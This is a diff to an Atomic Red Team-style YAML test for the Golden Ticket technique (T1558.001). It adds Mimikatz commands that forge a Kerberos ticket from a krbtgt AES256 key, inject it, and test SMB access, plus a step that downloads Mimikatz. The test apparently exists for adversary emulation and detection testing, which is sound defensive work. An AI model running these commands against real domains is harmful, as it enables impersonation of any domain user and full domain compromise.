@@ -1,25 +1,18 @@
----
-attack_technique: T1558
-display_name: Steal or Forge Kerberos Tickets
-
+attack_technique: T1558.001
+display_name: 'Steal or Forge Kerberos Tickets: Golden Ticket'
 atomic_tests:
 - name: Crafting golden tickets with mimikatz
+  auto_generated_guid: 9726592a-dabc-4d4d-81cd-44070008b3af
   description: |
-    Once the hash of the special krbtgt user is retrieved it is possible to craft ticket granting ticket imporsonating any user in the domain. this test craft a golden ticket and then perform a request with it.
-
+    Once the hash of the special krbtgt user is retrieved it is possible to craft Kerberos Ticket Granting Ticket impersonating any user in the domain.
+    This test crafts a Golden Ticket and then performs an SMB request with it, thus triggering a service ticket request (event ID 4769).
   supported_platforms:
     - windows
-
-
   input_arguments:
-    output_file:
-      description: mimikatz output file
-      type: path
-      default: PathToTest\bin\Mimikatz\x64\mimikatz.log
     domain_sid:
       description: Sid of the targeted domain
       type: string
-      default: Sid
+      default: S-1-5-21-1723555596-1415287819-2705645101
     domain:
       description: Targeted domain
       type: string
@@ -27,20 +20,24 @@ atomic_tests:
     account:
       description: Account to impersonate
       type: string
-      default: krbtgt
+      default: goldenticketfakeuser
     krbtgt_aes256_key:
-      description: Krbtgt hash
+      description: Krbtgt AES256 key
       type: string
-      default: key
+      default: b7268361386090314acce8d9367e55f55865e7ef8e670fbe4262d6c94098a9e9
     machine:
-      description: machine to target with crafted golden ticket
+      description: machine to target (without domain suffix) with crafted golden ticket
       type: string
-      default: DC1
-    mimikatz_path:
-      description: mimikatz windows executable
+      default: server
+    output_file:
+      description: Output file
       type: path
-      default: PathToTest\\bin\Mimikatz\x64\mimikatz.exe
-
+      default: '%tmp%\mimikatz\x64\mimikatz.log'
+    mimikatz_path:
+      description: Mimikatz windows executable
+      type: path
+      default: '%tmp%\mimikatz\x64\mimikatz.exe'
+  dependency_executor_name: powershell
   dependencies:
   - description: |
       Mimikatz executor must exist on disk and at specified location (#{mimikatz_path})
@@ -53,14 +50,13 @@ atomic_tests:
       Expand-Archive $env:TEMP\mimikatz.zip $env:TEMP\mimikatz -Force
       New-Item -ItemType Directory (Split-Path $mimikatz_path) -Force | Out-Null
       Move-Item $env:TEMP\mimikatz\x64\mimikatz.exe $mimikatz_path -Force
-
   executor:
     name: command_prompt
-    elevation_required: true # indicates whether command must be run with admin privileges. If the elevation_required attribute is not defined, the value is assumed to be false
-    command: | # these are the actaul attack commands, at least one command must be provided
+    elevation_required: false
+    command: |
       klist purge
-      #{mimikatz_path} "log #{output_file}" "kerberos::golden /domain:#{domain} /sid:#{domain_sid} /aes256:#{krbtgt_aes256_key} /user:#{account} /ptt" "exit" > $null
-      powershell.exe /c "$session = New-CimSession -ComputerName #{machine}; Get-SMBShare -CimSession $session; Remove-CimSession $session"
+      #{mimikatz_path} "log #{output_file}" "kerberos::golden /domain:#{domain} /sid:#{domain_sid} /aes256:#{krbtgt_aes256_key} /user:#{account} /ptt" "exit"
+      net view \\#{machine}.#{domain}
+    cleanup_command: |
       klist purge
-    cleanup_command: | # you can remove the cleanup_command section if there are no cleanup commands
-      'rm #{output_file}'
+      del #{output_file}
